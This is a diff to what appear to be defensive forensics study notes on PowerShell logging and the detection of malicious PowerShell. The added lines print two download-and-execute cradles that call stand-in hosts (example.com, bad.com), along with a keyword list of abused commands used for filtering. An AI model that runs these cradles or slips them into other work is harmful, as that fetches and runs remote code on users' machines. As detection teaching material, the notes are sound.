@@ -1656,9 +1656,6 @@ Invoke-Command –ComputerName host –ScriptBlock {Start-Process c:\temp\evil.e
 	- .ps1
 	- ActiveXObject
 
-
----
-
 <br>
 
 ### PowerShell Logging
@@ -1670,8 +1667,64 @@ Invoke-Command –ComputerName host –ScriptBlock {Start-Process c:\temp\evil.e
 - Powershell/Operational
 	- Powershell downgrade attacks can circumvent logging and security by running ```powershell -Version 2 -Command <..>```
 - Script block logging includes scripts and some deobfuscation
+	- Script block: a collection of code that accomplishes a task
 - Windows Powershell.evtx is older but still useful (EID 400/800)
 - WinRM/Operational logs records inbound and outbound PowerShell Remoting
+	- Destination Hostname, IP, Logged On user (EID 6)
+	- Source of session creation (EID 91)
+	- Authenticating user account (EID 168)
+
+**Enable PowerShell Logging**
+- GPO - "Turn on Powershell Script Block Logging"
+- Suspicious scripts = "Warning" events
+
+**PowerShell Stealth Syntax**
+```powershell
+powershell -w Hidden -nop -noni -exec bypass IEX (New-ObjectSystem.Net.WebClient.downloadstring('http://example.com/a'))
+```
+- -W: WindowStyle (often "hidden")
+- -nop: NoProfile
+- -noni: NonInteractive 
+- -ec: EncodedCommand
+- -exec: Execution Policy (often "bypass")
+- IEX: Invoke-Expression (execute arbitrary commands, rarely used)
+- (New-ObjectSystem.Net.WebClient).DownloadFile()
+- Start-BitsTransfer
+- Invoke-WebRequest
+
+<br>
+
+### Quick Wins - PowerShell
+- PowerShell/Operational Log
+	- EID 4103 records module/pipeline output
+	- EID 4104 record code (scripts) executed (look for "Warning" events)
+- PowerShell download cradle heavily used in the wild
+	- ```IEX (New-Object Net.WebClient).dowloadstring("http://bad.com/bad.ps1")```
+- Filter using commonly abused keywords
+	- download
+	- IEX
+	- rundll32
+	- http
+	- Start-Process
+	- Invoke-Expression
+	- Invoke-Command
+	- syswow64
+	- FromBase64String
+	- WebClient
+	- bitstransfer
+	- Reflection
+	- powershell -version
+	- Invoke-WmiMethod
+	- Invoke-CimMethos
+- Look for encoding and obfuscation
+
+
+
+<br>
+
+---
+
+<br>
 
 # Windows Forensics
 
@@ -2306,10 +2359,7 @@ echo  "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AV
 <br>
 
 ## Powershell CommandLine Switches
-- -W: WindowStyle
-- -nop: NoProfile
-- -noni: NonInteractive
-- -ec: EncodedCommand
+
 
 <script src="https://unpkg.com/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js"></script>
 <script>addBackToTop({
